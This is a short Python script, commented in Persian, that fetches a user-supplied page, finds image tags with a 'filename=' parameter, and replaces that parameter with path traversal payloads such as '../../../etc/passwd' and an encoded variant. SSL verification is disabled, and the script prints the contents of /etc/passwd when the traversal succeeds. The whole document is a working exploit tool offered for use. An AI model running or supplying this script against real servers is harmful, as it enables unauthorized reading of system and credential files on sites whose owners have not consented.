import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs

# هشدارهای SSL رو غیرفعال کن
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ورودی آدرس هدف
url = input("Enter the page URL (e.g. https://site.com/page): ")

# لیست پی‌لودهای path traversal
payloads = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd"  # encoded
]

# درخواست و پارس HTML
session = requests.Session()
res = session.get(url, verify=False)
soup = BeautifulSoup(res.text, "html.parser")

# تگ‌های <img> رو پیدا کن
img_tags = soup.find_all("img")
print(f"[+] Found {len(img_tags)} <img> tags\n")

found = 0

for img in img_tags:
    src = img.get("src")
    if not src:
        continue

    # فقط اونایی که پارامتر filename دارن
    if "filename=" in src:
        found += 1
        full_url = urljoin(url, src)
        print(f"[*] Found target image: {full_url}")

        # بررسی با پی‌لودهای مختلف
        for p in payloads:
            new_url = full_url.split("filename=")[0] + "filename=" + p
            print(f"  [+] Trying payload: {p}")
            r = session.get(new_url, verify=False)

            # بررسی وجود root در /etc/passwd
            if "root:x:0:0" in r.text:
                print("  [!!] VULNERABLE: /etc/passwd found!\n")
                print(r.text[:500])
                break
        print()

if found == 0:
    print("[-] No image tag with 'filename=' parameter found.")
